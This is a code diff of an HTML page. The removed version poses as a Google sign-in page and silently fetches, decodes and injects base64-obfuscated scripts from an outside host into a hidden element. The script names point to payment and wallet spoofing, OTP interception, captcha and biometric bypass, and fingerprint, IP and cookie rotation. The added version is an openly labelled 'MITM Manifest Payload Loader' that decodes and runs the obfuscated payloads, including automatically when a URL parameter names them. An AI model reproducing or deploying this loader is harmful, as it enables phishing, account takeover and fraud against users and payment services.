@@ -2,67 +2,117 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in – Google Accounts</title>
-  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MITM Manifest Payload Loader</title>
   <style>
-    body { margin: 0; background: #fff; font-family: "Roboto", sans-serif; }
-    .hidden-loader { position: fixed; top: -9999px; left: -9999px; visibility: hidden; }
+    body { background: #000; color: #0f0; font-family: monospace; padding: 2em; }
+    .log { margin-bottom: 1em; }
+    select { margin-bottom: 1em; min-width: 300px; }
+    button { margin-left: 1em; }
+    .success { color: #0f0; }
+    .fail { color: #f55; }
   </style>
 </head>
 <body>
-  <div class="hidden-loader" id="injector"></div>
+  <h2 style="color:#0f0;">MITM Manifest Payload Loader</h2>
+  <div>
+    <label for="payloads" style="color:#fff;">Choose payload(s):</label>
+    <select id="payloads" multiple size="8"></select>
+    <button id="inject">Inject Selected</button>
+  </div>
+  <div id="log"></div>
   <script>
-    const spoofTargets = [
-  "src-scripts-ai-openai-spoof.js.b64",
-  "src-scripts-auth-biometric.js.b64",
-  "src-scripts-device-fingerprint.js.b64",
-  "src-scripts-finance-moonpay_confirm.js.b64",
-  "src-scripts-finance-paypal-spoof.js.b64",
-  "src-scripts-finance-stripe_radar.js.b64",
-  "src-scripts-finance-wallets-spoof.js.b64",
-  "src-scripts-location-geofence.js.b64",
-  "src-scripts-network-typecloak.js.b64",
-  "src-scripts-scripts-amazon-spoof.js.b64",
-  "src-scripts-scripts-captcha-bypass.js.b64",
-  "src-scripts-scripts-claude-spoof.js.b64",
-  "src-scripts-scripts-coinbase-spoof.js.b64",
-  "src-scripts-scripts-faceid-pass.js.b64",
-  "src-scripts-scripts-location-fence-bypass.js.b64",
-  "src-scripts-scripts-old-device-fingerprint.js.b64",
-  "src-scripts-scripts-otp-intercept.js.b64",
-  "src-scripts-scripts-rotate-cookies.js.b64",
-  "src-scripts-scripts-rotate-headers.js.b64",
-  "src-scripts-scripts-rotate-ip.js.b64",
-  "src-scripts-scripts-rotate-tokens.js.b64",
-  "src-scripts-scripts-spoof-coinbase.js.b64",
-  "src-scripts-scripts-spoof-openai.js.b64",
-  "src-scripts-scripts-spoof-stripe.js.b64",
-  "src-scripts-scripts-spoof-textnow.js.b64",
-  "src-scripts-scripts-stripe-radar-spoof.js.b64",
-  "src-scripts-scripts-tiktok-login-bypass.js.b64",
-  "src-scripts-scripts-voice-ai-bypass.js.b64",
-  "src-scripts-scripts-wise-spoof.js.b64",
-  "src-scripts-security-captcha.js.b64",
-  "src-scripts-security-otp.js.b64",
-  "src-scripts-social-instagram_shadowban.js.b64",
-  "src-scripts-social-tiktok-spoof.js.b64",
-  "src-scripts-social-tiktok_autologin.js.b64"
-];
-    const cdnBase = "https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
-    spoofTargets.forEach(async (file) => {
-      try {
-        const res = await fetch(cdnBase + file);
-        const encoded = await res.text();
-        const decoded = atob(encoded);
-        const script = document.createElement("script");
-        script.textContent = decoded;
-        document.getElementById("injector").appendChild(script);
-        console.log(`[✓] Injected: ${file}`);
-      } catch (e) {
-        console.error(`[✗] Failed: ${file}`, e);
+    const logBox = document.getElementById("log");
+    const log = (msg, cls = "") => {
+      const div = document.createElement("div");
+      div.className = "log" + (cls ? " " + cls : "");
+      div.innerHTML = msg;
+      logBox.appendChild(div);
+    };
+
+    // Parse "inject" from URL (?inject=foo.js,bar.js or #inject=foo.js,bar.js)
+    function getAutoInjectTargets() {
+      const query = new URLSearchParams(location.search);
+      let inject = query.get("inject");
+      if (!inject && location.hash.startsWith("#inject=")) {
+        inject = decodeURIComponent(location.hash.replace(/^#inject=/, ''));
       }
-    });
+      return inject ? inject.split(",").map(x => x.trim()).filter(Boolean) : [];
+    }
+
+    // File manifest and injection
+    const manifestURL = location.href.split("/public/")[0] + "/public/manifest.json";
+    const baseURL = location.href.split("/public/")[0] + "/public/obfuscated/";
+    let allPayloads = [];
+
+    // Safe filename check
+    const safe = s => /^[\w.-]+\.js$/.test(s);
+
+    // Inject one or more payloads by name (array)
+    async function injectPayloads(payloads) {
+      for (const target of payloads) {
+        if (!safe(target)) {
+          log(`Skipped unsafe target: ${target}`, "fail");
+          continue;
+        }
+        const b64URL = `${baseURL}${target}.b64`;
+        log(`[📦] Fetching: <code>${b64URL}</code>`);
+        try {
+          const res = await fetch(b64URL);
+          if (!res.ok) throw new Error(`HTTP ${res.status}`);
+          const encoded = await res.text();
+          const decoded = atob(encoded.trim());
+          const script = document.createElement("script");
+          script.type = "text/javascript";
+          script.textContent = decoded;
+          document.body.appendChild(script);
+          log(`[🚀] Injected: ${target}`, "success");
+        } catch (err) {
+          log(`[❌] Failed: ${target}: ${err.message}`, "fail");
+        }
+      }
+    }
+
+    // Load manifest and populate dropdown
+    fetch(manifestURL)
+      .then(res => res.json())
+      .then(files => {
+        const select = document.getElementById("payloads");
+        files.forEach(f => {
+          if (typeof f === "string" && f.endsWith(".js.b64")) {
+            const name = f.replace(/\.js\.b64$/, ".js");
+            allPayloads.push(name);
+            const opt = document.createElement("option");
+            opt.value = name;
+            opt.text = name;
+            select.appendChild(opt);
+          }
+        });
+        log("Loaded manifest: " + files.length + " payloads");
+
+        // If URL specifies auto-inject, do it now
+        const auto = getAutoInjectTargets();
+        if (auto.length) {
+          // Optionally select them in UI
+          [...select.options].forEach(opt => {
+            if (auto.includes(opt.value)) opt.selected = true;
+          });
+          log("[🔁] Auto-injecting: " + auto.join(", "));
+          injectPayloads(auto);
+        }
+      })
+      .catch(e => log("Failed to load manifest: " + e.message, "fail"));
+
+    // Manual bulk injection by dropdown
+    document.getElementById("inject").onclick = () => {
+      const select = document.getElementById("payloads");
+      const selected = Array.from(select.selectedOptions).map(o => o.value);
+      if (!selected.length) {
+        log("No payload selected", "fail");
+        return;
+      }
+      injectPayloads(selected);
+    };
   </script>
 </body>
 </html>
